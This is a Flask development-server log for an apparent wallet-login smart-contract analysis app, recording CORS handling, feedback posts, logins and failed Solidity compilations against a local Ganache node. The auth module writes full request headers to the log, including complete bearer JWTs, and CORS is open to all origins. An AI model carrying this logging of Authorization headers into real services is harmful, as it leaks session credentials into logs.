2025-06-23 06:03:21,692 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:21,703 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:21,708 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:21,713 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 06:03:21,716 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:21] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-23 06:03:21,731 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:03:21,783 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 2, statut: OK, poids de la requ√™te: 2.0
2025-06-23 06:03:21,785 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:21,787 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:21,788 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:21,790 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:03:21,792 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:21] "POST /feedback HTTP/1.1" 200 -
2025-06-23 06:05:48,477 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:05:48,529 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 3, statut: KO, poids de la requ√™te: 0.0
2025-06-23 06:05:48,532 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:05:48,534 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:05:48,535 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:05:48,536 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:05:48,539 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:05:48] "POST /feedback HTTP/1.1" 200 -
2025-06-23 07:19:46,353 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:19:46,512 - app.app - INFO - Application started
2025-06-23 07:19:46,522 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.20.0.5:8000
2025-06-23 07:19:46,523 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:23:30,794 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:30,812 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:30,818 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:30,822 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:23:30,831 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:30] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 07:23:30,850 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:23:30,855 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjIxNDl9.-nTDx_b3SE1ZoGCC2ZXg9LoutTVhgWdUVZXbz8OE-0g', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:23:30,857 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:23:30,858 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:23:30,861 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:31,326 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:31,329 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:31,330 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:31,331 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:31,334 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:23:31,336 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:31] "POST /login HTTP/1.1" 200 -
2025-06-23 07:23:35,066 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:35,069 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:35,073 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:35,075 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:23:35,077 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:35] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 07:23:35,091 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:35,100 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 07:23:35,105 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 07:23:35,110 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp5jeiazsi.sol
2025-06-23 07:23:35,127 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 07:23:35,130 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 07:23:35,141 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 07:23:35,142 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 07:23:35,143 - app.services.contract_service - INFO - Temporary file /tmp/tmp5jeiazsi.sol removed
2025-06-23 07:23:35,145 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 07:23:35,148 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:35,150 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:35,151 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:35,152 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:23:35,153 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:35] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 07:26:54,251 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:26:54,504 - app.app - INFO - Application started
2025-06-23 07:26:54,517 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.23.0.5:8000
2025-06-23 07:26:54,519 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:26:59,862 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:26:59,865 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjcwMTF9.2zJvSunSulvsCyB62Eu-56nJ9uI6f1Jl4cKllxePfh0', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:26:59,867 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:26:59,868 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:26:59,870 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:00,318 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:00,322 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:27:00,324 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:27:00,326 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:27:00,328 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:27:00,332 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 07:27:00] "POST /login HTTP/1.1" 200 -
2025-06-23 07:27:03,364 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:03,379 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 07:27:03,389 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 07:27:03,394 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpqw3arb_m.sol
2025-06-23 07:27:03,403 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 07:27:03,405 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 07:27:03,416 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 07:27:03,418 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 07:27:03,419 - app.services.contract_service - INFO - Temporary file /tmp/tmpqw3arb_m.sol removed
2025-06-23 07:27:03,420 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 07:27:03,422 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:27:03,423 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:27:03,424 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:27:03,426 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:27:03,428 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 07:27:03] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 08:50:43,328 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 08:50:43,498 - app.app - INFO - Application started
2025-06-23 08:50:43,513 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.28.0.5:8000
2025-06-23 08:50:43,515 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 08:50:44,013 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:50:44,016 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:50:44,019 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:50:44,023 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:50:44,028 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 08:50:44] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 08:50:44,046 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 08:50:44,049 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjkyMzB9.Fgj2JbzifY72kZjTx2_jzX29zOrmvVs2hhewi9OMoYM', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 08:50:44,053 - app.api.auth - INFO - Request content type: application/json
2025-06-23 08:50:44,054 - app.api.auth - INFO - Processing JSON request
2025-06-23 08:50:44,057 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:50:44,539 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:50:44,544 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:50:44,546 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:50:44,547 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:50:44,551 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:50:44,555 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 08:50:44] "POST /login HTTP/1.1" 200 -
